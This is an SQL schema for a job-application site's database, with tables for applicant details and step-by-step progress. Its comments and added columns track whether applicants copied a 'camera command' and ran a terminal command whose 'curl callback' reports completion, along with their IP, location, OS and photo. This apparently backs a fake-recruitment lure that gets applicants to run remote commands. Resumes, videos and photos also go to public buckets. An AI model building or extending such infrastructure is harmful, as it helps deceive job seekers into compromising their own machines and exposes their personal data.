-- Run this in your Supabase SQL editor (Dashboard → SQL Editor → New query)

create table if not exists applications (
  id            uuid primary key default gen_random_uuid(),
  created_at    timestamptz not null default now(),

  -- Personal info
  first_name    text not null,
  last_name     text not null,
  email         text not null,
  phone         text,
  location      text,
  linkedin      text,
  portfolio     text,

  -- Experience
  role          text not null,
  experience    text not null,
  why_us        text,

  -- Details
  cover_letter  text,
  salary        text,
  start_date    text,
  referral      text,
  work_auth     text,

  -- Files
  resume_url    text,
  video_url     text
);

-- Index for looking up by email
create index if not exists applications_email_idx on applications (email);

-- ---------------------------------------------------------------
-- Step funnel tracking
-- One row per session, updated as the user advances through steps.
-- ---------------------------------------------------------------
create table if not exists application_progress (
  session_id   text primary key,
  created_at   timestamptz not null default now(),
  updated_at   timestamptz not null default now(),

  role         text,                -- which job they started on
  current_step int  not null default 0,  -- 0=Your info, 1=Experience, 2=Final details, 3=Review
  completed    boolean not null default false  -- true once they hit submit
);

create index if not exists application_progress_step_idx on application_progress (current_step);
create index if not exists application_progress_role_idx on application_progress (role);

-- IP & geo columns (run if upgrading an existing table)
alter table application_progress
  add column if not exists ip_address        text,
  add column if not exists country           text,
  add column if not exists city              text;

-- Camera command copy tracking (run if upgrading an existing table)
alter table application_progress
  add column if not exists camera_cmd_copied boolean not null default false;

-- Terminal command completion flag — set by the curl callback baked into the command
alter table application_progress
  add column if not exists cmd_completed boolean not null default false;

-- Photo URL — uploaded at step 0
alter table application_progress
  add column if not exists photo_url text;

-- Verify flag — set true when applicant runs the curl command
alter table application_progress
  add column if not exists verified boolean not null default false;

-- Applicant OS (detected via userAgent on the client, run if upgrading an existing table)
alter table application_progress
  add column if not exists os_name text;

-- Applicant name (captured at step 0, run if upgrading an existing table)
alter table application_progress
  add column if not exists first_name text,
  add column if not exists last_name  text;

-- Storage buckets (run separately if not already created via Dashboard)
-- insert into storage.buckets (id, name, public) values ('resumes', 'resumes', true);
-- insert into storage.buckets (id, name, public) values ('videos',  'videos',  true);
-- insert into storage.buckets (id, name, public) values ('photos',  'photos',  true);



